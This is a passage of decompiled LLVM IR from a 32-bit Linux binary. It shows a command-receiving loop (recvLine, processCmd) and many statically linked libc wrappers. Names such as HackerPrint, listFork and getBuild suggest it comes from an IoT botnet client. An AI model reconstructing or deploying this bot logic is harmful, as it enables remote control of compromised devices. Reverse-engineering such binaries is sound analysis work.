  %tmp103 = inttoptr i32 %v4_8051df8 to i8*
  br i1 %v1_8051e04, label %dec_label_pc_8051d67, label %dec_label_pc_8051e0a

dec_label_pc_8051e0a:                             ; preds = %dec_label_pc_8051de9, %dec_label_pc_8051d3f
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_8051d3f ], [ %stack_var_-40.0, %dec_label_pc_8051de9 ]
  %v4_8051e14 = inttoptr i32 %stack_var_-40.1.lcssa to i8*
  store i8* %v4_8051e14, i8** %stack_var_-5376, align 4
  %v5_8051e17 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-132)
  %v9_8051e1c = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_8051e1c, i1* %cf.global-to-local, align 1
  %v7_8051e20 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_8051e20, label %dec_label_pc_8051e32.lr.ph, label %dec_label_pc_8051e4c

dec_label_pc_8051e32.lr.ph:                       ; preds = %dec_label_pc_8051e0a
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8051e32

dec_label_pc_8051e32:                             ; preds = %dec_label_pc_8051e32.lr.ph, %dec_label_pc_8051e32
  %storemerge156 = phi i32 [ 1, %dec_label_pc_8051e32.lr.ph ], [ %v4_8051e41, %dec_label_pc_8051e32 ]
  %v0_8051e35 = load i32, i32* @ebp, align 4
  %v2_8051e35 = mul i32 %storemerge156, 4
  %v3_8051e35 = add i32 %v2_8051e35, -124
  %v4_8051e35 = add i32 %v3_8051e35, %v0_8051e35
  %v5_8051e35 = inttoptr i32 %v4_8051e35 to i32*
  %v6_8051e35 = load i32, i32* %v5_8051e35, align 4
  %v4_8051e39 = inttoptr i32 %v6_8051e35 to i8*
  store i8* %v4_8051e39, i8** %stack_var_-5376, align 4
  %v2_8051e3c = call i32 @free(i32 %v6_8051e35)
  %v4_8051e41 = add nuw i32 %storemerge156, 1
  %v10_8051e47 = icmp ult i32 %v4_8051e41, %stack_var_-40.1.lcssa
  store i1 %v10_8051e47, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8051e41, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_8051e4c, label %dec_label_pc_8051e32

dec_label_pc_8051e4c:                             ; preds = %dec_label_pc_8051e32, %dec_label_pc_8051e0a, %dec_label_pc_8051c64, %dec_label_pc_8051b0b, %dec_label_pc_8051ad4, %dec_label_pc_8051a8c, %dec_label_pc_80517f5
  %v0_8051e52 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_8051e52 = ptrtoint i8* %v0_8051e52 to i32
  store i8* %v0_8051e52, i8** %stack_var_-5376, align 4
  %v7_8051e67 = call i32 @recvLine(i32 %v1_8051e52, i8* %tmp98, i32 4096)
  %v8_8051e6f = icmp ne i32 %v7_8051e67, -1
  store i1 %v8_8051e6f, i1* %cf.global-to-local, align 1
  %v13_8051e6f = icmp eq i32 %v7_8051e67, -1
  %v1_8051e73 = icmp eq i1 %v13_8051e6f, false
  br i1 %v1_8051e73, label %dec_label_pc_80519f7, label %dec_label_pc_80517de

; uselistorder directives
  uselistorder i32 %v7_8051e67, { 0, 2, 1 }
  uselistorder i32 %v4_8051e41, { 1, 0, 2 }
  uselistorder i32 %storemerge156, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v1_8051d8f, { 1, 0 }
  uselistorder i32 %stack_var_-40.131, { 0, 3, 2, 1 }
  uselistorder i8* %v3_8051d74, { 2, 1, 0 }
  uselistorder i32 %v5_8051cc2, { 1, 3, 0, 2 }
  uselistorder i1 %v0_8051c4d, { 1, 0 }
  uselistorder i32 %v7_8051c4b, { 1, 0 }
  uselistorder i8* %storemerge15, { 1, 0 }
  uselistorder i32 %v5_8051c0e, { 1, 0 }
  uselistorder i32 %v2_8051c02, { 1, 0 }
  uselistorder i8* %storemerge15142, { 1, 0 }
  uselistorder i32 %v6_8051bbb, { 1, 0 }
  uselistorder i32 %v6_8051b92, { 1, 0 }
  uselistorder i32 %v6_8051b6d, { 1, 0 }
  uselistorder i8* %v5_8051b4a, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_8051b47, { 4, 5, 0, 1, 2, 6, 7, 3, 8 }
  uselistorder i32 %v6_8051b44, { 1, 0 }
  uselistorder i8* %storemerge16.lcssa, { 1, 0 }
  uselistorder i32 %storemerge17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v0_805199d, { 1, 0 }
  uselistorder i32 %storemerge18, { 1, 0, 2 }
  uselistorder i32 %v2_805196a, { 1, 0 }
  uselistorder i32 %v2_8051956, { 1, 0 }
  uselistorder i32 %v2_805194d, { 1, 0 }
  uselistorder i32 %v0_8051922, { 1, 0 }
  uselistorder i32 %v0_80518c7, { 1, 0 }
  uselistorder i32 %storemerge19, { 1, 2, 0, 3 }
  uselistorder i8* %tmp100, { 5, 2, 1, 4, 3, 0, 6, 7, 8, 9 }
  uselistorder i32 %v2_8051c71, { 1, 0, 2, 3 }
  uselistorder i8* %v5_8051b23, { 3, 0, 1, 2 }
  uselistorder i8* %tmp98, { 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_8051e4c, { 2, 0, 5, 4, 6, 1, 7, 8, 3 }
  uselistorder i32 %v2_8051763, { 1, 0, 2 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i8** %stack_var_-5376, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 0, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 44, 12, 11, 45, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 29, 0, 38, 1, 3, 2, 46, 4, 37, 5, 6, 35, 7, 36, 8, 9, 34, 10, 11, 13, 14, 12, 15, 16, 17, 18, 33, 19, 20, 21, 22, 23, 27, 28, 24, 25, 26, 30, 31, 39, 32, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 7, 0, 6, 1, 5, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 209, 4, 3, 2, 1, 0, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i8*)* @strstr, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 17, 16, 0 }
  uselistorder i8** @global_var_805e480.20, { 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_805ba5f.470, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 0, 3, 2, 1 }
  uselistorder i32 (i32)* @srand, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 26, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1, 2, 3, 4, 5, 6, 24, 25 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 1, 3, 2, 0 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051e32, { 1, 0 }
  uselistorder label %dec_label_pc_8051de9, { 1, 0 }
  uselistorder label %dec_label_pc_8051d67, { 1, 0 }
  uselistorder label %dec_label_pc_8051d3f, { 1, 0 }
  uselistorder label %dec_label_pc_8051ccc, { 1, 0 }
  uselistorder label %dec_label_pc_8051bf6, { 1, 0 }
  uselistorder label %dec_label_pc_8051be5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051bdb, { 1, 0 }
  uselistorder label %dec_label_pc_8051b74, { 1, 0 }
  uselistorder label %dec_label_pc_8051b0b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051b01, { 1, 0 }
  uselistorder label %dec_label_pc_8051ad4, { 1, 0 }
  uselistorder label %dec_label_pc_80519f4, { 1, 0 }
  uselistorder label %dec_label_pc_8051989, { 1, 0 }
  uselistorder label %dec_label_pc_8051967, { 1, 0 }
  uselistorder label %dec_label_pc_80518b3, { 1, 0 }
  uselistorder label %dec_label_pc_8051889, { 1, 0 }
  uselistorder label %dec_label_pc_80517de, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80517b7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051666, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051e86 = call i32 @vfork()
  %v5_8051e89 = icmp ult i32 %v0_8051e86, -4095
  %v1_8051e8e = icmp eq i1 %v5_8051e89, false
  call void @__pseudo_cond_branch(i1 %v1_8051e8e, i32 134568064)
  ret i32 %v0_8051e86
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8051e98 = load i32, i32* @edi, align 4
  %v0_8051e99 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_8051eb1 = add i32 %arg2, -12
  %v6_8051eb7 = icmp ugt i32 %v1_8051eb1, 2
  br i1 %v6_8051eb7, label %dec_label_pc_8051ec7, label %dec_label_pc_8051eb9

dec_label_pc_8051eb9:                             ; preds = %entry
  %v4_8051ebd = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8051eb1)
  br label %dec_label_pc_8051ee9

dec_label_pc_8051ec7:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8051ecf = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8051ecf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051ecf, -4095
  br i1 %tmp, label %dec_label_pc_8051ee7, label %dec_label_pc_8051edb

dec_label_pc_8051edb:                             ; preds = %dec_label_pc_8051ec7
  %v1_8051edb = call i32 @__errno_location(i32 %v0_8051e99)
  %v0_8051ee0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ee0 = sub i32 0, %v0_8051ee0
  %v2_8051ee2 = inttoptr i32 %v1_8051edb to i32*
  store i32 %v1_8051ee0, i32* %v2_8051ee2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ee7

dec_label_pc_8051ee7:                             ; preds = %dec_label_pc_8051ec7, %dec_label_pc_8051edb
  %v0_8051ee7 = phi i32 [ %v2_8051ecf, %dec_label_pc_8051ec7 ], [ -1, %dec_label_pc_8051edb ]
  br label %dec_label_pc_8051ee9

dec_label_pc_8051ee9:                             ; preds = %dec_label_pc_8051eb9, %dec_label_pc_8051ee7
  %v0_8051eee = phi i32 [ %v4_8051ebd, %dec_label_pc_8051eb9 ], [ %v0_8051ee7, %dec_label_pc_8051ee7 ]
  store i32 %v0_8051e99, i32* @ebx, align 4
  store i32 %v0_8051e98, i32* @edi, align 4
  ret i32 %v0_8051eee

; uselistorder directives
  uselistorder i32 %v2_8051ecf, { 1, 0, 2 }
  uselistorder i32 %v0_8051e99, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051ee9, { 1, 0 }
  uselistorder label %dec_label_pc_8051ee7, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ef0 = load i32, i32* @edi, align 4
  store i32 %v0_8051ef0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8051f08 = load i32, i32* @ebx, align 4
  %v1_8051f10 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8051f10, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f10, -4095
  br i1 %tmp, label %dec_label_pc_8051f28, label %dec_label_pc_8051f1c

dec_label_pc_8051f1c:                             ; preds = %entry
  %v1_8051f1c = call i32 @__errno_location(i32 %v0_8051f08)
  %v0_8051f21 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051f21 = sub i32 0, %v0_8051f21
  %v2_8051f23 = inttoptr i32 %v1_8051f1c to i32*
  store i32 %v1_8051f21, i32* %v2_8051f23, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051f28

dec_label_pc_8051f28:                             ; preds = %entry, %dec_label_pc_8051f1c
  %v0_8051f2b = phi i32 [ %v1_8051f10, %entry ], [ -1, %dec_label_pc_8051f1c ]
  %v2_8051f2d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f2d, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051f2b

; uselistorder directives
  uselistorder i32 %v1_8051f10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f28, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f58 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f58, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8051f6b = call i32 @access(i32 %v0_8051f58, i32 %tmp4)
  store i32 %v2_8051f6b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051f6b, -4095
  br i1 %tmp, label %dec_label_pc_8051f84, label %dec_label_pc_8051f78

dec_label_pc_8051f78:                             ; preds = %entry
  %v0_8051f78 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f78 = call i32 @__errno_location(i32 %v0_8051f78)
  %v0_8051f7d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f7d = sub i32 0, %v0_8051f7d
  %v2_8051f7f = inttoptr i32 %v1_8051f78 to i32*
  store i32 %v1_8051f7d, i32* %v2_8051f7f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f84

dec_label_pc_8051f84:                             ; preds = %entry, %dec_label_pc_8051f78
  %v0_8051f85 = phi i32 [ %v2_8051f6b, %entry ], [ -1, %dec_label_pc_8051f78 ]
  %v2_8051f88 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f88, i32* @ebx, align 4
  ret i32 %v0_8051f85

; uselistorder directives
  uselistorder i32 %v2_8051f6b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @access, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051f84, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f8c = load i32, i32* @edi, align 4
  store i32 %v0_8051f8c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8051f94 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051f9c = call i32 @chdir(i32 %v0_8051f94)
  store i32 %v0_8051f94, i32* @ebx, align 4
  store i32 %v1_8051f9c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f9c, -4095
  br i1 %tmp, label %dec_label_pc_8051fb4, label %dec_label_pc_8051fa8

dec_label_pc_8051fa8:                             ; preds = %entry
  %v1_8051fa8 = call i32 @__errno_location(i32 %v0_8051f94)
  %v0_8051fad = load i32, i32* %edi.global-to-local, align 4
  %v1_8051fad = sub i32 0, %v0_8051fad
  %v2_8051faf = inttoptr i32 %v1_8051fa8 to i32*
  store i32 %v1_8051fad, i32* %v2_8051faf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051fb4

dec_label_pc_8051fb4:                             ; preds = %entry, %dec_label_pc_8051fa8
  %v0_8051fb5 = phi i32 [ %v1_8051f9c, %entry ], [ -1, %dec_label_pc_8051fa8 ]
  %v2_8051fb4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051fb4, i32* @edx, align 4
  %v2_8051fb8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fb8, i32* @edi, align 4
  ret i32 %v0_8051fb5

; uselistorder directives
  uselistorder i32 %v1_8051f9c, { 1, 0, 2 }
  uselistorder i32 %v0_8051f94, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fb4, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fbc = load i32, i32* @edi, align 4
  store i32 %v0_8051fbc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051fc4 = load i32, i32* @ebx, align 4
  %v1_8051fcc = call i32 @close(i32 %arg1)
  store i32 %v0_8051fc4, i32* @ebx, align 4
  store i32 %v1_8051fcc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051fcc, -4095
  br i1 %tmp, label %dec_label_pc_8051fe4, label %dec_label_pc_8051fd8

dec_label_pc_8051fd8:                             ; preds = %entry
  %v1_8051fd8 = call i32 @__errno_location(i32 %v0_8051fc4)
  %v0_8051fdd = load i32, i32* %edi.global-to-local, align 4
  %v1_8051fdd = sub i32 0, %v0_8051fdd
  %v2_8051fdf = inttoptr i32 %v1_8051fd8 to i32*
  store i32 %v1_8051fdd, i32* %v2_8051fdf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051fe4

dec_label_pc_8051fe4:                             ; preds = %entry, %dec_label_pc_8051fd8
  %v0_8051fe5 = phi i32 [ %v1_8051fcc, %entry ], [ -1, %dec_label_pc_8051fd8 ]
  %v2_8051fe8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fe8, i32* @edi, align 4
  ret i32 %v0_8051fe5

; uselistorder directives
  uselistorder i32 %v1_8051fcc, { 1, 0, 2 }
  uselistorder i32 %v0_8051fc4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fe4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fec = load i32, i32* @ebx, align 4
  store i32 %v0_8051fec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8051fff = call i32 @dup2(i32 %v0_8051fec, i32 %tmp4)
  store i32 %v2_8051fff, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051fff, -4095
  br i1 %tmp, label %dec_label_pc_8052018, label %dec_label_pc_805200c

dec_label_pc_805200c:                             ; preds = %entry
  %v0_805200c = load i32, i32* %stack_var_-4, align 4
  %v1_805200c = call i32 @__errno_location(i32 %v0_805200c)
  %v0_8052011 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052011 = sub i32 0, %v0_8052011
  %v2_8052013 = inttoptr i32 %v1_805200c to i32*
  store i32 %v1_8052011, i32* %v2_8052013, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052018

dec_label_pc_8052018:                             ; preds = %entry, %dec_label_pc_805200c
  %v0_8052019 = phi i32 [ %v2_8051fff, %entry ], [ -1, %dec_label_pc_805200c ]
  %v2_805201c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805201c, i32* @ebx, align 4
  ret i32 %v0_8052019

; uselistorder directives
  uselistorder i32 %v2_8051fff, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052018, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052020 = load i32, i32* @ebx, align 4
  store i32 %v0_8052020, i32* %stack_var_-4, align 4
  %v1_8052029 = call i32 @fork(i32 %v0_8052020)
  store i32 %v1_8052029, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052029, -4095
  br i1 %tmp, label %dec_label_pc_8052040, label %dec_label_pc_8052034

dec_label_pc_8052034:                             ; preds = %entry
  %v0_8052034 = load i32, i32* %stack_var_-4, align 4
  %v1_8052034 = call i32 @__errno_location(i32 %v0_8052034)
  %v0_8052039 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052039 = sub i32 0, %v0_8052039
  %v2_805203b = inttoptr i32 %v1_8052034 to i32*
  store i32 %v1_8052039, i32* %v2_805203b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052040

dec_label_pc_8052040:                             ; preds = %entry, %dec_label_pc_8052034
  %v0_8052041 = phi i32 [ %v1_8052029, %entry ], [ -1, %dec_label_pc_8052034 ]
  %v2_8052040 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052040, i32* @edx, align 4
  %v2_8052044 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052044, i32* @ebx, align 4
  ret i32 %v0_8052041

; uselistorder directives
  uselistorder i32 %v1_8052029, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052040, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805204b = ptrtoint i32* %stack_var_-8 to i32
  %v2_8052052 = call i32 @getrlimit(i32 7, i32 %v2_805204b)
  store i32 256, i32* @edx, align 4
  %v2_805205f = icmp slt i32 %v2_8052052, 0
  br i1 %v2_805205f, label %dec_label_pc_8052067, label %dec_label_pc_8052063

dec_label_pc_8052063:                             ; preds = %entry
  %v3_8052063 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8052063, i32* @edx, align 4
  br label %dec_label_pc_8052067

dec_label_pc_8052067:                             ; preds = %entry, %dec_label_pc_8052063
  %v0_8052067 = phi i32 [ 256, %entry ], [ %v3_8052063, %dec_label_pc_8052063 ]
  ret i32 %v0_8052067

; uselistorder directives
  uselistorder label %dec_label_pc_8052067, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052070 = load i32, i32* @ebx, align 4
  store i32 %v0_8052070, i32* %stack_var_-4, align 4
  %v1_8052079 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8052079, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052079, -4095
  br i1 %tmp, label %dec_label_pc_8052090, label %dec_label_pc_8052084

dec_label_pc_8052084:                             ; preds = %entry
  %v0_8052084 = load i32, i32* %stack_var_-4, align 4
  %v1_8052084 = call i32 @__errno_location(i32 %v0_8052084)
  %v0_8052089 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052089 = sub i32 0, %v0_8052089
  %v2_805208b = inttoptr i32 %v1_8052084 to i32*
  store i32 %v1_8052089, i32* %v2_805208b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052090

dec_label_pc_8052090:                             ; preds = %entry, %dec_label_pc_8052084
  %v0_8052091 = phi i32 [ %v1_8052079, %entry ], [ -1, %dec_label_pc_8052084 ]
  %v2_8052094 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052094, i32* @ebx, align 4
  ret i32 %v0_8052091

; uselistorder directives
  uselistorder i32 %v1_8052079, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_8052090, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052098 = load i32, i32* @ebx, align 4
  store i32 %v0_8052098, i32* %stack_var_-4, align 4
  %v1_80520a1 = call i32 @getpid(i32 %v0_8052098)
  store i32 %v1_80520a1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80520a1, -4095
  br i1 %tmp, label %dec_label_pc_80520b8, label %dec_label_pc_80520ac

dec_label_pc_80520ac:                             ; preds = %entry
  %v0_80520ac = load i32, i32* %stack_var_-4, align 4
  %v1_80520ac = call i32 @__errno_location(i32 %v0_80520ac)
  %v0_80520b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520b1 = sub i32 0, %v0_80520b1
  %v2_80520b3 = inttoptr i32 %v1_80520ac to i32*
  store i32 %v1_80520b1, i32* %v2_80520b3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520b8

dec_label_pc_80520b8:                             ; preds = %entry, %dec_label_pc_80520ac
  %v0_80520b9 = phi i32 [ %v1_80520a1, %entry ], [ -1, %dec_label_pc_80520ac ]
  %v2_80520bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80520bc, i32* @ebx, align 4
  ret i32 %v0_80520b9

; uselistorder directives
  uselistorder i32 %v1_80520a1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520b8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80520c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80520c0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80520d3 = call i32 @int80_syscall(i32 191)
  store i32 %v1_80520d3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80520d3, -4095
  br i1 %tmp, label %dec_label_pc_80520ec, label %dec_label_pc_80520e0

dec_label_pc_80520e0:                             ; preds = %entry
  %v0_80520e0 = load i32, i32* %stack_var_-4, align 4
  %v1_80520e0 = call i32 @__errno_location(i32 %v0_80520e0)
  %v0_80520e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520e5 = sub i32 0, %v0_80520e5
  %v2_80520e7 = inttoptr i32 %v1_80520e0 to i32*
  store i32 %v1_80520e5, i32* %v2_80520e7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520ec

dec_label_pc_80520ec:                             ; preds = %entry, %dec_label_pc_80520e0
  %v0_80520ed = phi i32 [ %v1_80520d3, %entry ], [ -1, %dec_label_pc_80520e0 ]
  %v2_80520f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80520f0, i32* @ebx, align 4
  ret i32 %v0_80520ed

; uselistorder directives
  uselistorder i32 %v1_80520d3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520ec, { 1, 0 }
}

